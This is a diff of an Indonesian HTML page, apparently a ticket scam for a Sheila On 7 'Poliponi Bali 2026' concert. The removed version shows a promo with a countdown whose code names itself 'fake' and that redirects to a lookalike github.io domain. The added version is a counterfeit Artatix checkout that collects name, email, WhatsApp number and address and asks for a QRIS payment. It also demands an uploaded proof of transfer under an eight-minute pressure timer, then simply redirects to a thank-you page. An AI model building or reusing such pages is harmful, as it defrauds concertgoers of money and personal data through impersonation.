@@ -4,406 +4,546 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 
-<title>OPEN PAKET BUNDLING SHEILA ON 7 BALI 2026</title>
+<title>Checkout Ticket - Poliponi 2026</title>
 
 <style>
+
 *{
 margin:0;
 padding:0;
 box-sizing:border-box;
-font-family:Arial, sans-serif;
+font-family:Arial, Helvetica, sans-serif;
 }
 
 body{
-background:#f5f5f5;
-color:#111;
+background:#f4f7fb;
+color:#111827;
 }
 
-.container{
-max-width:700px;
+/* CONTAINER */
+.wrapper{
+width:100%;
+max-width:1300px;
 margin:auto;
+padding:30px 20px;
+}
+
+/* HEADER */
+.top-header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:35px;
+flex-wrap:wrap;
+gap:15px;
+}
+
+.logo{
+font-size:34px;
+font-weight:800;
+color:#356dff;
+}
+
+.secure{
+font-size:15px;
+color:#6b7280;
+}
+
+/* MAIN GRID */
+.checkout-grid{
+display:grid;
+grid-template-columns:1.1fr 0.8fr;
+gap:30px;
+align-items:start;
+}
+
+/* CARD */
+.card{
 background:#fff;
-min-height:100vh;
+border-radius:28px;
+padding:30px;
+box-shadow:
+0 10px 30px rgba(0,0,0,0.05);
+}
+
+/* LEFT */
+.title{
+font-size:42px;
+font-weight:800;
+margin-bottom:10px;
+}
+
+.subtitle{
+color:#6b7280;
+margin-bottom:30px;
+line-height:1.6;
+}
+
+/* TIMER */
+.timer-box{
+background:#fff5f5;
+border:1px solid #ffd6d6;
+padding:18px;
+border-radius:20px;
+margin-bottom:30px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+flex-wrap:wrap;
+gap:10px;
+}
+
+.timer-label{
+font-weight:700;
+color:#dc2626;
+}
+
+.timer{
+font-size:28px;
+font-weight:800;
+color:#dc2626;
+}
+
+/* INPUT */
+.form-group{
+margin-bottom:22px;
+}
+
+.form-group label{
+display:block;
+margin-bottom:10px;
+font-weight:700;
+font-size:15px;
+}
+
+.form-group input,
+.form-group textarea{
+width:100%;
+padding:18px;
+border-radius:18px;
+border:1px solid #dbe3ef;
+font-size:16px;
+outline:none;
+transition:0.2s;
+background:#fff;
+}
+
+.form-group input:focus,
+.form-group textarea:focus{
+border-color:#356dff;
+box-shadow:0 0 0 4px rgba(53,109,255,0.12);
+}
+
+/* QRIS */
+.qris-box{
+background:#f8fbff;
+border:1px solid #dbe8ff;
+border-radius:24px;
+padding:25px;
+margin-top:10px;
+text-align:center;
+}
+
+.qris-title{
+font-size:22px;
+font-weight:800;
+margin-bottom:18px;
+}
+
+.qris-box img{
+width:100%;
+max-width:300px;
+border-radius:18px;
+box-shadow:0 8px 20px rgba(0,0,0,0.08);
+}
+
+/* FILE */
+.upload-box{
+border:2px dashed #b8c7e7;
+padding:25px;
+border-radius:22px;
+text-align:center;
+background:#f8fbff;
+}
+
+.upload-box input{
+margin-top:15px;
+}
+
+/* RIGHT SIDE */
+.summary-title{
+font-size:28px;
+font-weight:800;
+margin-bottom:25px;
 }
 
 .banner{
 width:100%;
-display:block;
-}
-
-.content{
-padding:18px;
-}
-
-.event-badge{
-display:inline-block;
-background:#ff4d00;
-color:#fff;
-font-weight:bold;
-padding:8px 14px;
-border-radius:10px;
-font-size:13px;
-margin-bottom:14px;
-}
-
-h1{
-font-size:28px;
-line-height:1.3;
-font-weight:900;
-margin-bottom:14px;
-}
-
-.subtitle{
-font-size:15px;
-line-height:1.7;
-color:#444;
-margin-bottom:20px;
-}
-
-.info-box{
-background:#fafafa;
-border:2px solid #111;
-border-radius:18px;
-padding:18px;
-margin-bottom:22px;
-}
-
-.info-item{
-margin-bottom:14px;
-}
-
-.info-item:last-child{
-margin-bottom:0;
-}
-
-.label{
-font-size:12px;
-font-weight:bold;
-color:#777;
-margin-bottom:5px;
-text-transform:uppercase;
-}
-
-.value{
-font-size:16px;
-font-weight:700;
-}
-
-.section{
-margin-bottom:28px;
-}
-
-.section h2{
-font-size:22px;
-margin-bottom:15px;
-font-weight:900;
-}
-
-.section p{
-font-size:15px;
-line-height:1.9;
-margin-bottom:14px;
-color:#333;
-}
-
-.rules{
-padding-left:20px;
-}
-
-.rules li{
-margin-bottom:14px;
-line-height:1.8;
-font-size:15px;
-}
-
-.highlight{
-background:#fff200;
-padding:2px 6px;
-font-weight:bold;
-}
-
-.fake-wait{
-background:#111;
-color:#fff;
-padding:18px;
-border-radius:16px;
-text-align:center;
+border-radius:24px;
+overflow:hidden;
 margin-bottom:25px;
 }
 
-.fake-wait h3{
-font-size:18px;
-margin-bottom:8px;
-}
-
-.fake-time{
-font-size:40px;
-font-weight:900;
-color:#00ff66;
-margin-top:10px;
-}
-
-.buy-btn{
-display:block;
+.banner img{
 width:100%;
-text-align:center;
-background:#ff4d00;
-color:#fff;
-text-decoration:none;
-padding:18px;
-font-size:20px;
+display:block;
+}
+
+.ticket-item{
+display:flex;
+justify-content:space-between;
+margin-bottom:18px;
+gap:10px;
+}
+
+.ticket-name{
+font-weight:700;
+line-height:1.5;
+}
+
+.ticket-price{
+font-weight:800;
+}
+
+.line{
+height:1px;
+background:#e9eef7;
+margin:25px 0;
+}
+
+.total{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:25px;
+}
+
+.total h2{
+font-size:18px;
+}
+
+.total-price{
+font-size:34px;
 font-weight:900;
-border-radius:16px;
-margin-top:20px;
-box-shadow:0 8px 0 #c93800;
-transition:0.2s;
+color:#356dff;
 }
 
-.buy-btn:active{
-transform:translateY(4px);
-box-shadow:0 4px 0 #c93800;
+/* BUTTON */
+.pay-btn{
+width:100%;
+border:none;
+padding:20px;
+border-radius:22px;
+font-size:18px;
+font-weight:800;
+cursor:pointer;
+transition:0.25s;
+background:#cfd8ff;
+color:#fff;
+pointer-events:none;
 }
 
-.footer{
-text-align:center;
-padding:30px 20px;
-font-size:13px;
-color:#777;
-line-height:1.8;
+.pay-btn.active{
+background:#356dff;
+pointer-events:auto;
+box-shadow:0 10px 25px rgba(53,109,255,0.3);
+}
+
+.pay-btn.active:hover{
+transform:translateY(-2px);
+}
+
+/* MOBILE */
+@media(max-width:980px){
+
+.checkout-grid{
+grid-template-columns:1fr;
+}
+
+.title{
+font-size:34px;
+}
+
+.card{
+padding:24px;
+}
+
+.total-price{
+font-size:28px;
+}
+
 }
 
 @media(max-width:600px){
 
-h1{
+.wrapper{
+padding:18px;
+}
+
+.title{
+font-size:30px;
+}
+
+.logo{
+font-size:28px;
+}
+
+.timer{
 font-size:24px;
 }
 
-.section h2{
-font-size:20px;
-}
-
-.buy-btn{
-font-size:18px;
-padding:16px;
-}
-
-.fake-time{
-font-size:34px;
+.pay-btn{
+font-size:16px;
+padding:18px;
 }
 
 }
+
 </style>
 </head>
 
 <body>
 
-<div class="container">
+<div class="wrapper">
 
-<img src="banner-deskripsi.png" class="banner">
-
-<div class="content">
-
-<div class="event-badge">
-OPEN PAKET BUNDLING 2026
+<!-- HEADER -->
+<div class="top-header">
+<div class="logo">
+Artatix
 </div>
 
-<h1>
-Paket Bundling Tiket Sheila On 7 Bali 2026 Resmi Dibuka
+<div class="secure">
+🔒 Transaksi Aman & Terpercaya
+</div>
+</div>
+
+<!-- GRID -->
+<div class="checkout-grid">
+
+<!-- LEFT -->
+<div class="card">
+
+<h1 class="title">
+Checkout
 </h1>
 
-<p class="subtitle">
-Nikmati pengalaman konser terbaik bersama Sheila On 7 dalam event spesial POLIPONI BALI 2026 yang akan diselenggarakan di Bali United Training Center. Paket bundling ini memberikan keuntungan lebih untuk para penonton dengan akses tiket prioritas, merchandise eksklusif, serta benefit tambahan yang hanya tersedia dalam periode pembelian terbatas.
-</p>
-
-<div class="info-box">
-
-<div class="info-item">
-<div class="label">EVENT</div>
-<div class="value">POLIPONI BALI 2026</div>
+<div class="subtitle">
+Lengkapi data dan lakukan pembayaran untuk melanjutkan pemesanan ticket event.
 </div>
 
-<div class="info-item">
-<div class="label">SPECIAL PERFORMANCE</div>
-<div class="value">Sheila On 7 • Dialog Dini Hari • 510</div>
+<!-- TIMER -->
+<div class="timer-box">
+
+<div class="timer-label">
+Waktu Pembayaran
 </div>
 
-<div class="info-item">
-<div class="label">LOKASI</div>
-<div class="value">Bali United Training Center</div>
-</div>
-
-<div class="info-item">
-<div class="label">TANGGAL</div>
-<div class="value">04 Juli 2026</div>
-</div>
-
-<div class="info-item">
-<div class="label">PROMOTED BY</div>
-<div class="value">LETRALIVE</div>
+<div class="timer" id="countdown">
+08:00
 </div>
 
 </div>
 
-<div class="fake-wait">
+<!-- FORM -->
 
-<h3>
-Antrian Pembelian Tiket Bundling
-</h3>
+<div class="form-group">
+<label>Nama Lengkap *</label>
+<input type="text" id="nama" placeholder="Masukkan nama lengkap">
+</div>
 
-<p>
-Sedang terjadi lonjakan pembelian tiket konser Sheila On 7 Bali 2026.
-Estimasi waktu tunggu:
-</p>
+<div class="form-group">
+<label>Email *</label>
+<input type="email" id="email" placeholder="Masukkan email aktif">
+</div>
 
-<div class="fake-time" id="countdown">
-02:00:00
+<div class="form-group">
+<label>Nomor WhatsApp *</label>
+<input type="tel" id="wa" placeholder="08xxxxxxxxxx">
+</div>
+
+<div class="form-group">
+<label>Alamat *</label>
+<textarea rows="4" id="alamat" placeholder="Masukkan alamat lengkap"></textarea>
+</div>
+
+<!-- QRIS -->
+<div class="qris-box">
+
+<div class="qris-title">
+Pembayaran QRIS
+</div>
+
+<img src="qris-pembayaran.png" alt="QRIS Pembayaran">
+
+</div>
+
+<br>
+
+<!-- UPLOAD -->
+<div class="upload-box">
+
+<div style="font-size:20px;font-weight:800;margin-bottom:10px;">
+Upload Bukti Pembayaran *
+</div>
+
+<div style="color:#6b7280;">
+Upload screenshot / bukti transfer pembayaran
+</div>
+
+<input type="file" id="bukti" accept="image/*">
+
+</div>
+
+<br><br>
+
+<button class="pay-btn" id="payBtn">
+Beli Sekarang
+</button>
+
+</div>
+
+<!-- RIGHT -->
+<div class="card">
+
+<div class="summary-title">
+Ringkasan Pesanan
+</div>
+
+<div class="banner">
+<img src="banner-deskripsi.png">
+</div>
+
+<div class="ticket-item">
+<div class="ticket-name">
+Paket 4 Orang : Festival
+</div>
+
+<div class="ticket-price">
+Rp 1.900.000
+</div>
+</div>
+
+<div class="ticket-item">
+<div class="ticket-name">
+Biaya Layanan
+</div>
+
+<div class="ticket-price">
+Rp 50.000
+</div>
+</div>
+
+<div class="line"></div>
+
+<div class="total">
+
+<h2>Total Pembayaran</h2>
+
+<div class="total-price">
+Rp 1.950.000
 </div>
 
 </div>
 
-<div class="section">
+<div style="
+background:#f8fbff;
+padding:22px;
+border-radius:20px;
+line-height:1.8;
+color:#4b5563;
+">
 
-<h2>
-Deskripsi Event
-</h2>
+✅ E-Ticket akan dikirim otomatis setelah verifikasi pembayaran berhasil.<br><br>
 
-<p>
-POLIPONI BALI 2026 merupakan salah satu rangkaian konser dan hiburan terbesar tahun 2026 yang menghadirkan pengalaman live performance dengan konsep modern, visual interaktif, serta lineup musisi pilihan Indonesia.
-</p>
+✅ Pastikan bukti transfer terlihat jelas dan tidak blur.<br><br>
 
-<p>
-Dalam pembukaan penjualan kali ini, tersedia <span class="highlight">Paket Bundling Sheila On 7</span> yang menjadi kategori paling diminati oleh pengunjung karena menghadirkan berbagai benefit eksklusif untuk penonton yang ingin menikmati konser dengan pengalaman terbaik.
-</p>
-
-<p>
-Event ini akan berlangsung di Bali United Training Center dengan kapasitas penonton terbatas dan sistem penjualan online resmi. Seluruh pembelian tiket dilakukan secara digital dan setiap transaksi akan mendapatkan kode booking otomatis setelah pembayaran berhasil diverifikasi.
-</p>
-
-<p>
-Selain penampilan spesial dari Sheila On 7, acara ini juga akan dimeriahkan oleh penampilan musisi lainnya seperti Dialog Dini Hari dan 510 yang siap menghadirkan suasana konser penuh energi dan nostalgia.
-</p>
-
-<p>
-Paket bundling ini dirancang khusus untuk mempermudah penonton mendapatkan tiket prioritas tanpa harus melakukan pembelian terpisah. Tiket bundling juga memberikan akses lebih cepat saat proses check-in event berlangsung.
-</p>
+✅ Pembayaran aman & terenkripsi.
 
 </div>
 
-<div class="section">
-
-<h2>
-Benefit Paket Bundling
-</h2>
-
-<ul class="rules">
-<li>Akses pembelian tiket prioritas konser Sheila On 7 Bali 2026.</li>
-
-<li>Kesempatan mendapatkan merchandise event eksklusif selama persediaan masih tersedia.</li>
-
-<li>QR digital ticket otomatis setelah pembayaran berhasil diverifikasi.</li>
-
-<li>Akses jalur fast check-in pada area event tertentu.</li>
-
-<li>Benefit bundling lebih hemat dibanding pembelian satuan.</li>
-
-<li>Kesempatan mengikuti giveaway official merchandise selama periode event berlangsung.</li>
-</ul>
-
-</div>
-
-<div class="section">
-
-<h2>
-Syarat dan Ketentuan
-</h2>
-
-<ul class="rules">
-
-<li>
-Pembelian tiket bundling hanya berlaku selama kuota masih tersedia.
-</li>
-
-<li>
-Setiap pembeli wajib mengisi data pemesanan dengan benar dan lengkap.
-</li>
-
-<li>
-Tiket yang sudah dibeli tidak dapat dibatalkan ataupun diuangkan kembali.
-</li>
-
-<li>
-Panitia tidak bertanggung jawab atas kesalahan pengisian data oleh pembeli.
-</li>
-
-<li>
-QR Ticket wajib ditunjukkan saat memasuki area event.
-</li>
-
-<li>
-Dilarang memperjualbelikan tiket di luar platform resmi.
-</li>
-
-<li>
-Pihak penyelenggara berhak melakukan perubahan teknis apabila diperlukan demi kelancaran acara.
-</li>
-
-<li>
-Dengan melakukan pembelian tiket, pembeli dianggap telah memahami dan menyetujui seluruh syarat dan ketentuan yang berlaku.
-</li>
-
-</ul>
-
-</div>
-
-<a href="https://poliponii2026.github.io/CATEGORY-POLIPONI/" class="buy-btn">
-BELI TIKET BUNDLING
-</a>
-
-<div class="footer">
-© 2026 POLIPONI BALI • Ticketing Partner by Artatix
 </div>
 
 </div>
+
 </div>
 
 <script>
 
-let fakeHours = 2;
-let fakeMinutes = 0;
-let fakeSeconds = 0;
+/* COUNTDOWN */
+let time = 8 * 60;
 
-function updateCountdown(){
+const countdown = document.getElementById('countdown');
 
-const countdown = document.getElementById("countdown");
+const timer = setInterval(() => {
 
-if(fakeSeconds === 0){
-if(fakeMinutes === 0){
-if(fakeHours !== 0){
-fakeHours--;
-fakeMinutes = 59;
-fakeSeconds = 59;
+let minutes = Math.floor(time / 60);
+let seconds = time % 60;
+
+minutes = minutes < 10 ? '0' + minutes : minutes;
+seconds = seconds < 10 ? '0' + seconds : seconds;
+
+countdown.innerHTML = `${minutes}:${seconds}`;
+
+time--;
+
+if(time < 0){
+
+clearInterval(timer);
+
+countdown.innerHTML = "EXPIRED";
+
+document.getElementById('payBtn').disabled = true;
+
+document.getElementById('payBtn').classList.remove('active');
+
 }
+
+}, 1000);
+
+/* VALIDATION */
+const nama = document.getElementById('nama');
+const email = document.getElementById('email');
+const wa = document.getElementById('wa');
+const alamat = document.getElementById('alamat');
+const bukti = document.getElementById('bukti');
+const payBtn = document.getElementById('payBtn');
+
+function validateForm(){
+
+if(
+nama.value.trim() !== '' &&
+email.value.trim() !== '' &&
+wa.value.trim() !== '' &&
+alamat.value.trim() !== '' &&
+bukti.files.length > 0
+){
+
+payBtn.classList.add('active');
+
 }else{
-fakeMinutes--;
-fakeSeconds = 59;
-}
-}else{
-fakeSeconds--;
-}
 
-let h = String(fakeHours).padStart(2,'0');
-let m = String(fakeMinutes).padStart(2,'0');
-let s = String(fakeSeconds).padStart(2,'0');
-
-countdown.innerHTML = `${h}:${m}:${s}`;
+payBtn.classList.remove('active');
 
 }
 
-setInterval(updateCountdown, 3000);
+}
 
-setTimeout(() => {
-window.location.href = "https://poliponii2026.github.io/CATEGORY-POLIPONI/";
-}, 300000);
+nama.addEventListener('input', validateForm);
+email.addEventListener('input', validateForm);
+wa.addEventListener('input', validateForm);
+alamat.addEventListener('input', validateForm);
+bukti.addEventListener('change', validateForm);
+
+/* REDIRECT */
+payBtn.addEventListener('click', function(){
+
+if(payBtn.classList.contains('active')){
+
+window.location.href = 'https://poliponii2026.github.io/THANKS-YOU-/';
+
+}
+
+});
 
 </script>
 
